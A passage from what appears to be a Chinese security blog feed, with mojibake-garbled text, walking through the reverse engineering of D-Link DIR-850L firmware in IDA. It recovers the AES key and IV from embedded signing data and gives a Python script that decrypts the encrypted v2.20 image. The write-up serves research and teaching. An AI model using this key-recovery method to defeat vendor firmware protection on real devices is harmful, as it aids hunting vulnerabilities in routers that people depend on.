æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¼šè·‘ä¸€äº›ä¸‰ç¯ç¨‹åºï¼Œè€Œä¸‰ç¯ç¨‹åºæœ‰éå¸¸å¤šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¸Œæœ›é€šè¿‡è¿™äº›ä¸‰ç¯ç¨‹åºæ¥ææƒã€‚</p></li>
<li><p>ç°åœ¨å¾ˆå¤šå‚å•†ä¼šè®¤ä¸ºï¼Œè‡ªå·±çš„è·¯ç”±å™¨èƒ½è¢«è§£åŒ…å¤ªä¸å®‰å…¨äº†ï¼Œå› æ­¤ä»–ä»¬ä¼šé€šè¿‡åŠ å¯†ï¼Œä½†æ˜¯æ¯æ¬¡æ›´æ–°æ¢ä»£æ—¶ï¼Œåä¸€ä»£çš„å›ºä»¶åŒ…éƒ½æ˜¯é€šè¿‡å‰ä¸€ä»£çš„å›ºä»¶ä¸­çš„æŸä¸ªè§£å¯†ç®—æ³•æ¥è§£å¯†çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨æŒ–æ˜
IOT
æ¼æ´æ—¶ï¼Œä¼šå…ˆæ‰¾åˆ°æ¯”è¾ƒè€çš„ä¸€äº›ç‰ˆæœ¬ï¼Œåˆ†æè§£å¯†ç®—æ³•ï¼Œè¿›è€Œè‡ªå·±å†™å‡ºè§£å¯†è„šæœ¬æ¥è§£å¯†æ–°ä¸€ä»£çš„å›ºä»¶åŒ…ã€‚</p></li>
<li><p>(å»ºè®®çœ‹åˆ°0x01åå†æ¥é˜…è¯»æœ¬æ¡)æˆ‘ä»¬åœ¨è·¯ç”±å™¨çš„ web user
ä¸Šå‘é€ä¸€ä¸ªæ›´æ–°è¯·æ±‚çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯ä¼šå…ˆå‘ç»™æœåŠ¡å™¨ä¸€ä¸ª http
è¯·æ±‚ï¼Œç„¶åè¢«æœåŠ¡å™¨çš„ httpd äºŒè¿›åˆ¶æ–‡ä»¶æ¥æ”¶ï¼Œhttpd ä¼š fork
ä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥å¯ç”¨äºŒè¿›åˆ¶æ–‡ä»¶ cgibin ï¼Œå¹¶æŠŠç¯å¢ƒå˜é‡å’Œ http çš„è¯·æ±‚å‘ç»™ cgi
ï¼Œ cgi
å®Œæˆå¤„ç†ä»¥åï¼ŒæŠŠå†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºæµä¹‹ç±»çš„ä¸œè¥¿ï¼Œå¹¶è¿”å›å®¢æˆ·</p></li>
<li><p>IDA åç¼–è¯‘ Mips
æ–‡ä»¶ä¼šæœ‰å¾ˆå¤šâ€œæ— ç”¨æ“ä½œâ€ï¼Œå°±æ˜¯ä¸¤ä¸ªå˜é‡æ¥å›èµ‹å€¼ä¹‹ç±»çš„ï¼Œè¿™æ˜¯ç”±äº Mips
æœ‰åˆ†æ”¯å»¶è¿Ÿçš„ç‰¹æ€§</p></li>
</ol>
<h1 id="x00-å‡†å¤‡å·¥ä½œ">0x00 å‡†å¤‡å·¥ä½œ</h1>
<p><img src="https://i0.imgs.ovh/2023/11/09/lto8e.png"
alt="lto8e.png" />
ä¸Šå›¾ä¸­é—´æœ‰è¿™æ ·ä¸€å¥è¯<code>Upgrade to Firmware V2.10 and then instantly go back into the web user interface and upgrade to Firmware V2.20</code></p>
<p>å®ƒå‘Šè¯‰æˆ‘ä»¬ï¼Œä»web
useræ›´æ–°åˆ°2.2ç‰ˆæœ¬æ—¶ï¼Œéœ€è¦å…ˆä»å®˜ç½‘ä¸‹è½½2.1çš„å›ºä»¶å¹¶æ›´æ–°åˆ°2.1æ‰è¡Œ</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ2.2å¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªåŠ å¯†å›ºä»¶åŒ…ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡<code>binwalk</code>ç›´æ¥è§£åŒ…ï¼Œä½†æ˜¯2.1å¯ä»¥</p>
<p>æˆ‘ä»¬downloadä¸¤ä¸ªåŒ…åˆ°æœ¬åœ°binwalkè§£åŒ…ä¸€ä¸‹çœ‹çœ‹</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/ltiAU.png" alt="ltiAU.png" />
<figcaption aria-hidden="true">ltiAU.png</figcaption>
</figure>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/ltjx0.png" alt="ltjx0.png" />
<figcaption aria-hidden="true">ltjx0.png</figcaption>
</figure>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¡®å®åƒæˆ‘ä»¬çŒœæƒ³çš„é‚£æ ·ï¼ŒV2.1æœªåŠ å¯†ï¼ŒV2.2åŠ å¯†</p>
<h1 id="x01-å®šä½è§£å¯†é€»è¾‘">0x01 å®šä½è§£å¯†é€»è¾‘</h1>
<p>é€šè¿‡ <strong>0xFF.3</strong>
æˆ‘ä»¬çŸ¥é“è¦åˆ†æcgibinå’Œhttpdæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨IDAæ‰“å¼€çœ‹ä¸€ä¸‹
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cgibin : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/htdocs</span><br><span class="line"></span><br><span class="line">httpd : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/sbin</span><br></pre></td></tr></table></figure></p>
<p>æˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹åœ¨æœ¬æ–‡ä¸­ä¸é‚£ä¹ˆé‡è¦çš„ httpd æ–‡ä»¶ï¼ŒIDA7.6
ä»¥ä¸Šçš„ç‰ˆæœ¬æ˜¯å¯ä»¥åç¼–è¯‘ Mips çš„ <img
src="https://i0.imgs.ovh/2023/11/09/l12OW.png" alt="l12OW.png" /> æˆ‘ä»¬åœ¨
function ä¸­æœç´¢
cgiï¼Œæ‰¾åˆ°<code>process_cgi</code>å‡½æ•°ï¼Œå¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰å¾ˆå¤šç¯å¢ƒå˜é‡å¦‚<code>GATEWAY_INTERFACE</code>å’Œ<code>CONTENT_LENGTH</code>ç­‰ï¼Œåœ¨è®¾ç½®å®Œç¯å¢ƒå˜é‡åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒè°ƒç”¨äº†<code>spawn</code>å‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹ä¸€ä¸‹
<img src="https://i0.imgs.ovh/2023/11/09/l1ZZe.png"
alt="l1ZZe.png" /></p>
<p><img src="https://i0.imgs.ovh/2023/11/09/l1lK3.png"
alt="l1lK3.png" /> å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ <strong>Line20</strong>
çš„ä½ç½®ï¼Œè¯¥è¿›ç¨‹æ˜¯è¢«forkèµ·æ¥çš„ï¼Œè€Œåœ¨ <strong>Line46</strong>
çš„ä½ç½®ï¼Œæˆ‘ä»¬æ‰§è¡Œäº† <code>execve</code> ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæˆ‘ä»¬çŸ¥é“ execve
çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯argvï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ç¯å¢ƒå˜é‡ï¼Œå› æ­¤æˆ‘ä»¬å›æº¯ä¸€ä¸‹</p>
<p>è€Œåœ¨è°ƒç”¨ <code>spawn</code> çš„å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œspawn
çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>*v77,v77,ptr</code>,è¿™é‡Œçš„ v77 å°±æ˜¯ file_pathï¼Œè€Œ
ptr å°±æ˜¯ env_ptrï¼Œæˆ‘ä»¬æ¥ç€æº¯æº(æº¯æºçš„æ—¶å€™æˆ‘ä»¬ä¼šå‘ç° file_path
çš„è°ƒç”¨å¤„éå¸¸å°‘ï¼Œè¿™æ˜¯å› ä¸º ida çš„åç¼–è¯‘å¹¶æ²¡æœ‰å°† file_path
çš„æ•°æ®ç±»å‹æ­£ç¡®å¤„ç†ï¼Œå¯¼è‡´ file_path ä¸‹é¢çš„ä¸€äº›å˜é‡ï¼Œå…¶å®å¯èƒ½å°±æ˜¯
file_pathï¼Œä½†å› ä¸ºå¤„ç†é”™äº†ï¼Œæ‰€ä»¥è¢«å‘½åä¸º v78 v79 ...)</p>
<p>å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬æŒ¨ä¸ªåˆ†æï¼Œè€Œå½“æˆ‘ä»¬çœ‹åˆ° v80 æ—¶ï¼Œå¯ä»¥çœ‹åˆ°å¯¹ v80
è¢«åšäº†æ‰‹è„šï¼ŒWker666 è¯´è¿™é‡Œæ˜¯å¯¹ cgi è¿›è¡Œä¸€äº›é€‰æ‹©ï¼Œä½†æˆ‘ STFW
ä»¥åä¹Ÿæ²¡æ‰¾åˆ°åŸå› ï¼Œå…ˆæç½®ä¸€ä¸‹å§</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1tB2.png" alt="l1tB2.png" />
<figcaption aria-hidden="true">l1tB2.png</figcaption>
</figure>
<p>è‡³æ­¤ï¼Œhttpd
å°±åˆ†æå®Œäº†ï¼Œhttpdä¸»è¦æ˜¯åšå‰ç«¯ç”¨çš„ï¼Œå®ƒæœ¬èº«ä¹Ÿæœ‰ä¸€äº›æ¼æ´ï¼Œä¸è¿‡è¿™é‡Œå°±ä¸å†åˆ†æäº†ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹cgibin</p>
<hr />
<p>æˆ‘ä»¬ç”¨ IDA æ‰“å¼€ cgibin æ–‡ä»¶ï¼Œå¾€ä¸‹æ‰¾åˆ° seamacgi_main (è¿™é‡Œæ²¡æ‰¾åˆ° seama
åˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€ï¼Œåªæ˜¯å› ä¸ºåœ¨ function ä¸­æœç´¢ enc å¯ä»¥æ‰¾åˆ° encrypt_main
ï¼Œæº¯æºåˆ†æå°±èƒ½æ‰¾åˆ° semacgi_main äº†) <img
src="https://i0.imgs.ovh/2023/11/09/l111j.png" alt="l111j.png" /></p>
<p>è·Ÿè¿› semacgi_main ,å¯ä»¥æ‰¾åˆ° encrypt_main
å‡½æ•°ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„è§£å¯†å‡½æ•°äº†</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1UfV.png" alt="l1UfV.png" />
<figcaption aria-hidden="true">l1UfV.png</figcaption>
</figure>
<h1 id="x02-è§£å¯†é€»è¾‘åˆ†æ">0x02 è§£å¯†é€»è¾‘åˆ†æ</h1>
<h3 id="è¢«ä¼ å…¥çš„å‚æ•°">è¢«ä¼ å…¥çš„å‚æ•°</h3>
<p>æˆ‘ä»¬æŸ¥çœ‹ encrypt_main å‡½æ•°çš„å¼•ç”¨ï¼Œå¯ä»¥åœ¨ sub_407664+668
å¤„æ‰¾åˆ°ä¸€å¤„è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯6ï¼Œç¬¬äºŒä¸ªå‚æ•°è¢«èµ‹å€¼äº†å¾ˆå¤šç±»ä¼¼äº-iï¼Œ-dä¹‹ç±»çš„ä¸œè¥¿ï¼Œç»“åˆ
encrypt_main å‡½æ•°æ˜¯ä¸ª mainï¼Œæˆ‘ä»¬çŒœæµ‹ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯
argcï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯argv</p>
<p>ä½†æ˜¯è¿™é‡Œçš„èµ‹å€¼æ–¹å¼å¾ˆå¥‡æ€ªï¼Œv116
æ˜¯<code>struct stat</code>ï¼Œæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œæˆ‘ä»¬å†å»åˆ«çš„å¼•ç”¨å¤„çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥åœ¨
encode_file_check å‡½æ•°ä¸­å‘ç°è¿™äº›å‚æ•°å…¶å®æ˜¯ä¸€ä¸ª char æ•°ç»„ï¼Œè¿™å°±ç¬¦åˆæˆ‘ä»¬å¯¹
argv çš„è®¤çŸ¥äº†ã€‚</p>
<p>æˆ‘ä»¬æŒ‰ y é”®å°† sub_407664 ä¸­çš„ v116 çš„æ•°æ®ç±»å‹ä¿®æ”¹æˆ char* å³å¯</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1iQJ.png" alt="l1iQJ.png" />
<figcaption aria-hidden="true">l1iQJ.png</figcaption>
</figure>
<p>æ¥ä¸‹æ¥åˆ†æ argv éƒ½æ˜¯äº›ä»€ä¹ˆä¸œè¥¿<br />
- ç¬¬ä¸€ä¸ªå‚æ•°: encimg - ç¬¬äºŒä¸ªå‚æ•°: -i (å°† v116
æ•°æ®ç±»å‹ä¿®æ”¹åï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°"-i"æ˜¯ v117ï¼Œè€Œå…¨å±€å˜é‡ ptr æ‰æ˜¯ v118) -
ç¬¬ä¸‰ä¸ªå‚æ•°: ptr(åœ¨ encode_file_check å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œptr ä¸
"/var/firmware.seama"
ä½œäº†æ¯”è¾ƒï¼Œå› æ­¤æˆ‘ä»¬çŒœæµ‹ptrå¯èƒ½æ˜¯æŒ‡å‘æ–‡ä»¶åå­—ç¬¦ä¸²çš„æŒ‡é’ˆ) - ç¬¬å››ä¸ªå‚æ•°: -s
- ç¬¬äº”ä¸ªå‚æ•°: byte_43CDB0(åœ¨ encode_file_check
å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œbyte_43CDB0 æ˜¯ä» <code>/etc/config/image_sign</code>
æ–‡ä»¶è¯»å‡ºäº†128ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°é‡Œé¢æ˜¯<code>wrgac25_dlink.2013gui_dir850l</code>)
- ç¬¬å…­ä¸ªå‚æ•°: -d</p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯<code>encimg -i file -s wrgac25_dlink.2013gui_dir850l -d</code></p>
<p>è¿™ä¹Ÿç¬¦åˆ argc = 6 çš„è¦æ±‚</p>
<h3 id="å‚æ•°åŠŸèƒ½">å‚æ•°åŠŸèƒ½</h3>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œä¸€èˆ¬æ¥è¯´ -h ä»£è¡¨çš„æ˜¯ helpï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ encrypt_main
å‡½æ•°çš„<code>case h:</code>ä¼šæ‰“å°ä»€ä¹ˆä¸œè¥¿</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_408F8C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &#123;OPTIONS&#125;\n&quot;</span>, <span class="string">&quot;encimg&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -h                      : show this message.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -v                      : Verbose mode.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -i &#123;input image file&#125;   : input image file.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -e                      : encode file.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -d                      : decode file.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;   -s                      : signature.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è€Œç»è¿‡ switch-case åï¼Œåœ¨ Line57 åˆ¤æ–­ dword_43CE40 ä¹Ÿå°±æ˜¯ signature
æ˜¯å¦å­˜åœ¨ï¼Œè¿™ä¸ªæ˜¯ -s å‚æ•°åšçš„äº‹æƒ…ï¼Œè€Œåœ¨ Line59 å¤„åˆ¤æ–­ file
æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸¤ä¸ªéƒ½é€šè¿‡ï¼Œå°±ä¼šè°ƒç”¨ sub_4090E0 å‡½æ•°ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1qvD.png" alt="l1qvD.png" />
<figcaption aria-hidden="true">l1qvD.png</figcaption>
</figure>
<p>åœ¨ sub_4090E0
å‡½æ•°çš„å‰ä¸€éƒ¨åˆ†ä¸­ï¼Œåšäº†æ–‡ä»¶æ ¡éªŒç­‰ä¸æ˜¯å¾ˆé‡è¦çš„æ“ä½œï¼Œè€Œé‡è¦çš„è§£å¯†æ“ä½œä»
<strong>Line108</strong> å¼€å§‹ï¼Œä¹Ÿå°±æ˜¯ä¸‹å›¾ä½ç½®ï¼Œæˆ‘å·²ç»åŠ å¥½æ³¨é‡Šäº†</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJCoX.png" alt="lJCoX.png" />
<figcaption aria-hidden="true">lJCoX.png</figcaption>
</figure>
<p>Line130-Line137 æ˜¯è®¾ç½®AESåŠ è§£å¯†å¯†é’¥<code>user_key</code>ï¼Œè€Œ
Line108-Line129
æ˜¯ç”¨<code>_____progs_board_fw_sign_data</code>åˆå§‹åŒ–<code>user_key</code>ï¼Œæ¥ç€ç”¨
encrypt å‡½æ•°å¯¹<code>user_key</code>åšä¸€äº›å¤„ç†ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ encrypt
å‡½æ•°</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJP5U.png" alt="lJP5U.png" />
<figcaption aria-hidden="true">lJP5U.png</figcaption>
</figure>
<p>è€Œè®¾ç½®å¥½å¯†é’¥ä»¥åï¼ŒLine158 å¤„è°ƒç”¨ AES_cbc_encrypt
å‡½æ•°(å¦‚ä¸‹å›¾)ï¼Œä½†æˆ‘ä»¬é€šè¿‡<a
href="https://blog.csdn.net/duanxingheng/article/details/11730617">OpenSSL-AES</a>è¿™ç¯‡æ–‡ç« çŸ¥é“ï¼ŒAES
ä¸å¯èƒ½åªæœ‰è¿™ä¹ˆç‚¹å‚æ•°ï¼Œå¹¶ä¸”æ ¹æ®åˆ†æï¼Œ v32 å’Œ mmap_file_ptr éƒ½æ˜¯ mmap_file
ï¼Œè¿™è‚¯å®šä¸å¯¹ã€‚</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJLr0.png" alt="lJLr0.png" />
<figcaption aria-hidden="true">lJLr0.png</figcaption>
</figure>
<p>æ‰€ä»¥æˆ‘ä»¬æŒ‰ y
é”®ï¼Œå°†<code>AES_cbc_encrypt</code>ä¿®æ”¹ä¸º<code>void AES_cbc_encrypt(const unsigned char *in, unsigned char *out,   size_t length, const AES_KEY *key,    unsigned char *ivec, const int enc);</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span>ï¼š éœ€è¦åŠ å¯†/è§£å¯†çš„æ•°æ®ï¼›</span><br><span class="line"></span><br><span class="line">outï¼š è®¡ç®—åè¾“å‡ºçš„æ•°æ®ï¼›</span><br><span class="line"></span><br><span class="line">lengthï¼š æ•°æ®é•¿åº¦ï¼ˆè¿™é‡Œä¸åŒ…å«åˆå§‹å‘é‡æ•°æ®é•¿åº¦ï¼‰</span><br><span class="line"></span><br><span class="line">keyï¼šå¯†é’¥</span><br><span class="line"></span><br><span class="line">ivecï¼š åˆå§‹å‘é‡ï¼ˆä¸€èˆ¬ä¸º<span class="number">16</span>å­—èŠ‚å…¨<span class="number">0</span>ï¼‰</span><br><span class="line"></span><br><span class="line">encï¼š <span class="title function_">AES_ENCRYPT</span>(<span class="number">1</span>) ä»£è¡¨åŠ å¯†ï¼Œ <span class="title function_">AES_DECRYPT</span>(<span class="number">0</span>) ä»£è¡¨è§£å¯†ï¼›</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJXIC.png" alt="lJXIC.png" />
<figcaption aria-hidden="true">lJXIC.png</figcaption>
</figure>
<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼ŒLine131-Line177 å°±æ˜¯å¾ˆæ ‡å‡†çš„ä¸€ä¸ª AES åŠ è§£å¯†</p>
<h1 id="è§£å¯†è„šæœ¬">è§£å¯†è„šæœ¬</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt_file</span>(<span class="params">key,iv,input_file,output_file</span>):</span><br><span class="line">    cipher = AES.new(<span class="built_in">bytes</span>(key),AES.MODE_CBC,<span class="built_in">bytes</span>(iv))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile, <span class="built_in">open</span>(output_file,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = infile.read(<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(chunk) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(chunk) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;aes error&quot;</span>)</span><br><span class="line">            decrypted_chunk = cipher.decrypt(chunk)</span><br><span class="line">            outfile.write(decrypted_chunk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">______progs_board_fw_sign_data =[<span class="number">0x6B</span>, <span class="number">0x35</span>, <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x2B</span>, <span class="number">0x62</span>, <span class="number">0x76</span>, <span class="number">0x57</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x5A</span>, <span class="number">0x36</span>, <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x74</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x4F</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x63</span>, <span class="number">0x69</span>, <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x5A</span>, <span class="number">0x71</span>, <span class="number">0x51</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x6D</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x35</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x2B</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x6E</span>, <span class="number">0x38</span>, <span class="number">0x62</span>, <span class="number">0x4E</span>, <span class="number">0x48</span>, <span class="number">0x5A</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x70</span>, <span class="number">0x36</span>, <span class="number">0x57</span>, <span class="number">0x43</span>, <span class="number">0x6C</span>, <span class="number">0x39</span>, <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x39</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x49</span>, <span class="number">0x6B</span>, <span class="number">0x69</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x0A</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, </span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x45</span>, <span class="number">0x50</span>, <span class="number">0x6F</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, </span><br><span class="line">  <span class="number">0x4A</span>, <span class="number">0x42</span>, <span class="number">0x46</span>, <span class="number">0x76</span>, <span class="number">0x39</span>, <span class="number">0x42</span>, <span class="number">0x4D</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x2B</span>, </span><br><span class="line">  <span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x51</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, <span class="number">0x4F</span>, <span class="number">0x38</span>, <span class="number">0x4F</span>, <span class="number">0x75</span>, <span class="number">0x46</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x62</span>, <span class="number">0x7A</span>, <span class="number">0x34</span>, <span class="number">0x66</span>, <span class="number">0x72</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x64</span>, <span class="number">0x4E</span>, </span><br><span class="line">  <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x67</span>, <span class="number">0x59</span>, <span class="number">0x4C</span>, <span class="number">0x75</span>, <span class="number">0x4F</span>, <span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_val_by_sig</span>(<span class="params">dec_sig_val,dec_len,sig</span>): <span class="comment"># encrypt å‡½æ•° pythonè¡¨ç¤º</span></span><br><span class="line">    sig_len = <span class="built_in">len</span>(sig)</span><br><span class="line">    loop_sig_idx = <span class="number">0</span></span><br><span class="line">    loop_dec_idx = <span class="number">1</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cur_sig = sig[loop_sig_idx]</span><br><span class="line">        loop_sig_idx+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(idx&gt;=dec_len):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(loop_sig_idx&gt;=sig_len):</span><br><span class="line">            loop_sig_idx=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">        dec_sig_val[idx] = loop_dec_idx ^ dec_sig_val[idx] ^ <span class="built_in">ord</span>(cur_sig)</span><br><span class="line">        loop_dec_idx+=<span class="number">1</span></span><br><span class="line">        idx+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> loop_dec_idx &gt;= <span class="number">252</span>:</span><br><span class="line">            loop_dec_idx = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">aes_key = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    aes_key.append(______progs_board_fw_sign_data[i+<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">iv = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">    iv.append(______progs_board_fw_sign_data[i+<span class="number">96</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;iv before dec: &#x27;</span>,iv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;aes_key before dec: &#x27;</span>,aes_key)</span><br><span class="line">dec_val_by_sig(iv,<span class="number">16</span>,<span class="string">&#x27;wrgac25_dlink.2013gui_dir850l&#x27;</span>)</span><br><span class="line">dec_val_by_sig(aes_key,<span class="number">32</span>,<span class="string">&#x27;wrgac25_dlink.2013gui_dir850l&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;iv before dec: &#x27;</span>,iv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;aes_key before dec: &#x27;</span>,aes_key)</span><br><span class="line"></span><br><span class="line">aes_decrypt_file(aes_key,iv,<span class="string">&#x27;/mnt/e/EdgeDownload/IOT/DIR850LB1_FW220WWb03.bin&#x27;</span>,<span class="string">&#x27;out.bin&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>è§£å¯†åå³å¯è§£åŒ…</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJZRR.png" alt="lJZRR.png" />
<figcaption aria-hidden="true">lJZRR.png</figcaption>
</figure>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>Mips</tag>
        <tag>Wifi</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Format String Summary</title>
    <url>/2024/01/21/Pwn%20-%20Format%20String%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
